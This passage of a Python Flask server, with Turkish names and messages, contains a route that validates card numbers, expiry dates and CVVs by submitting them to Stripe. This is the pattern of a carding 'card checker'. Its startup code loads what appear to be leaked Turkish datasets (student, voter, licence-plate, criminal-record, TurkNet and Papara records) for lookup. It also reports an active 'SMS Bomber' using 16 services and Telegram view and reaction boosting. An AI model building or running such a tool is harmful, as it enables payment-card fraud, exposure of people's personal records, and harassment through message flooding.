        return jsonify({'durum': 'hata', 'mesaj': 'JSON verisi gönderin'}), 400
    
    kart_no = data.get('kart_no', '').strip()
    ay = data.get('ay', '').strip()
    yil = data.get('yil', '').strip()
    cvv = data.get('cvv', '').strip()
    
    if not all([kart_no, ay, yil, cvv]):
        return jsonify({'durum': 'hata', 'mesaj': 'Tüm alanlar zorunlu'}), 400
    
    kart_no = re.sub(r'\D', '', kart_no)
    hatalar = kart_bilgilerini_kontrol(kart_no, ay, yil, cvv)
    
    if hatalar:
        return jsonify({'durum': 'hata', 'hatalar': hatalar}), 400
    
    if not STRIPE_SECRET_KEY:
        return jsonify({
            'durum': 'başarılı',
            'mesaj': 'Format geçerli (Stripe pasif)',
            'luhn_gecerli': luhn_kontrol(kart_no),
            'kart_no': kart_no[-4:]
        })
    
    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data={
                'type': 'card',
                'card[number]': kart_no,
                'card[exp_month]': ay,
                'card[exp_year]': yil,
                'card[cvc]': cvv
            },
            headers={
                'Authorization': f'Bearer {STRIPE_SECRET_KEY}',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        )
        
        if response.status_code == 200:
            return jsonify({
                'durum': 'başarılı',
                'mesaj': 'Stripe ile doğrulandı',
                'luhn_gecerli': luhn_kontrol(kart_no),
                'kart_no': kart_no[-4:],
                'payment_method_id': response.json().get('id')
            })
        else:
            return jsonify({
                'durum': 'hata',
                'mesaj': response.json().get('error', {}).get('message', 'Stripe hatası')
            }), 400
    except Exception as e:
        return jsonify({'durum': 'hata', 'mesaj': f'Stripe hatası: {str(e)}'}), 500

# ==================== UYGULAMA BAŞLATMA ====================

if __name__ == '__main__':
    print("\n" + "="*50)
    print("📂 VERİLER YÜKLENİYOR...")
    print("="*50)
    
    eokul_verileri_yukle()
    secmen_verileri_yukle()
    plaka_verileri_yukle()
    sicil_verileri_yukle()
    turknet_verileri_yukle()
    papara_verileri_yukle()
    
    print("\n" + "="*50)
    print("📊 API DURUMU")
    print("="*50)
    print(f"   ✅ E-Okul    : {len(eokul_veriler)} kayıt")
    print(f"   ✅ Seçmen    : {len(secmen_veriler)} kayıt")
    print(f"   ✅ Plaka     : {len(plaka_veriler)} kayıt")
    print(f"   ✅ Sicil     : {len(sicil_veriler)} kayıt")
    print(f"   ✅ TurkNet   : {len(turknet_veriler)} kayıt")
    print(f"   ✅ Papara    : {len(papara_veriler)} kayıt")
    print(f"   {'✅' if STRIPE_SECRET_KEY else '❌'} Stripe     : {'Aktif' if STRIPE_SECRET_KEY else 'Pasif'}")
    print(f"   {'✅' if TELEGRAM_BOT_TOKEN else '❌'} Telegram   : {'Aktif' if TELEGRAM_BOT_TOKEN else 'Pasif (opsiyonel)'}")
    print(f"   ✅ SMS Bomber : Aktif (16 servis)")
    print(f"   ✅ Telegram User Info : Aktif")
    print(f"   ✅ Telegram Post React : Aktif")
    print(f"   ✅ Telegram Post Views : Aktif")
    print("="*50)
    print("🚀 SUNUCU BAŞLATILIYOR...")
    print("="*50 + "\n")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
